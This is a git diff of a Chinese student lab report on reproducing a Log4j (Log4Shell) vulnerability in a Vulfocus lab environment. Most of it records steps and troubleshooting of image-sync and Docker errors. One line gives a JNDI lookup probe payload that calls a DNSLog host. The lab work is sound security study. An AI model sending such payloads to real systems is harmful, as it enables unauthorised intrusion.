@@ -128,6 +128,20 @@ emm 后面做着做着虚拟机挂了，直接打不开了，下了 `virtualbox`
 
 1. 找到靶标的【访问入口】
 
+看实验中启动的镜像提示
+
+2. 收集【威胁暴露面】信息
+
+3. 检测漏洞存在性
+
+主要有两种方法：
+
+- 确认受漏洞影响组件的【版本号】
+
+- 源代码审计
+
+实验中采用第二种方法
+
 ```bash
 docker exec -it 容器名 bash
 ```
@@ -142,13 +156,13 @@ cat /etc/shells
 ```bash
 docker cp 容器名：路径+文件 保存路径
 ```
-进行反编译，找到对应代码
+找到 `jar` 文件，反编译找到有问题的代码
 
-2. 收集【威胁暴露面】信息
+4. 验证漏洞可利用性
 
-3. 检测漏洞存在性
+使用 `PoC` 手动测试` ${jndi:ldap://0qxc3d.dnslog.cn/exp` ，域名改为 [DNSLog.cn](http://www.dnslog.cn/) 中随机生成的
 
-这里做着做着各种报错：
+然后这里做着做着各种报错：
 
 ![bug](img/bug.png)
 
@@ -160,7 +174,34 @@ docker cp 容器名：路径+文件 保存路径
 
 然而并没有用，重复一遍问题依然存在
 
-4. 验证漏洞可利用性
+试了几个方法：
+
+[vulfocus不能同步的解决方法/vulfocus同步失败](https://blog.csdn.net/m0_64563956/article/details/131229046#:~:text=GitHub%20-%20fofapro%2Fvulfocus%3A%20%F0%9F%9A%80Vulfocus%20%E6%98%AF%E4%B8%80%E4%B8%AA%E6%BC%8F%E6%B4%9E%E9%9B%86%E6%88%90%E5%B9%B3%E5%8F%B0%EF%BC%8C%E5%B0%86%E6%BC%8F%E6%B4%9E%E7%8E%AF%E5%A2%83%20docker%20%E9%95%9C%E5%83%8F%EF%BC%8C%E6%94%BE%E5%85%A5%E5%8D%B3%E5%8F%AF%E4%BD%BF%E7%94%A8%EF%BC%8C%E5%BC%80%E7%AE%B1%E5%8D%B3%E7%94%A8%E3%80%82%20docker%E6%8A%8Avulfocus%E7%9A%84image%EF%BC%88docker,vulfocus%2Fvulfocus%20docker%20ps%20-a%20docker%20start%20%7Bcontainer-id%7D%20%E6%89%93%E5%BC%80%E7%BD%91%E7%AB%99%E5%87%BA%E7%8E%B0%E2%80%9C%E6%9C%8D%E5%8A%A1%E5%99%A8%E5%86%85%E9%83%A8%E9%94%99%E8%AF%AF%E9%97%AE%E9%A2%98%E2%80%9D%EF%BC%8C%E8%80%8C%E4%B8%94%E9%95%9C%E5%83%8F%E5%90%8C%E6%AD%A5%E5%A4%B1%E8%B4%A5)
+ 
+即修改镜像源，报错不能解决
+
+[修改文件中的 url](https://github.com/fofapro/vulfocus/issues/299)
+
+即将容器内部的 `/vulfocus-api/dockerapi/views.py `文件拷贝至主机当前目录并修改当前目录下拷贝出来的 `views.py` 文件，修改 `get_timing_imgs` 函数，将 `vulfocus.fofa.so` 替换成 `vulfocus.io`，最后将修改好的 `views` 文件重新复制回容器内部，报错仍不能解决
+
+切换至 `root` 下执行相关命令，也不能解决
+
+然后试着试着 `docker` 也出现问题，例如：
+
+![bug2](img/bug2.png)
+
+查看日志后说是 `docker` 启动的问题
+
+于是尝试了各种方法，诸如
+
+更改至 `root` 下执行相关命令，修改下列文件配置等等
+
+![xiugai](img/xiugai.png)
+
+但问题还是没得到解决
+
 5. 评估漏洞利用效果
+
+
 
 
